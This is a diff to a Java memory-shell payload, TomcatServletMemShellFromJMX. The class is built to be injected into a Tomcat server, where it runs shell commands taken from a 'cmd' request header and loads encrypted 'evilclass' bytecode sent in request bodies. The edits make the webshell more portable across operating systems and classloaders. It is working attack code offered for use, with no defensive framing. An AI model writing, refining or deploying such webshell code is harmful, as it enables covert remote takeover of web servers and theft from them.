@@ -21,7 +21,6 @@ import javax.servlet.*;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 import javax.servlet.http.HttpSession;
-import java.io.File;
 import java.io.IOException;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
@@ -115,10 +114,10 @@ public class TomcatServletMemShellFromJMX extends AbstractTranslet implements Se
                     String cmd = request.getHeader("cmd");
                     if (cmd != null && !cmd.isEmpty()) {
                         String[] cmds = null;
-                        if (File.separator.equals("/")) {
-                            cmds = new String[]{"/bin/sh", "-c", cmd};
-                        } else {
+                        if (System.getProperty("os.name").toLowerCase().contains("win")) {
                             cmds = new String[]{"cmd", "/c", cmd};
+                        } else {
+                            cmds = new String[]{"/bin/bash", "-c", cmd};
                         }
                         String result = new Scanner(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\A").next();
                         response.getWriter().println(result);
@@ -133,7 +132,7 @@ public class TomcatServletMemShellFromJMX extends AbstractTranslet implements Se
                         Method method = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                         method.setAccessible(true);
                         byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
-                        Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), evilclass_byte, 0, evilclass_byte.length);
+                        Class evilclass = (Class) method.invoke(Thread.currentThread().getContextClassLoader(), evilclass_byte, 0, evilclass_byte.length);
                         evilclass.newInstance().equals(pageContext);
                     }
                 }
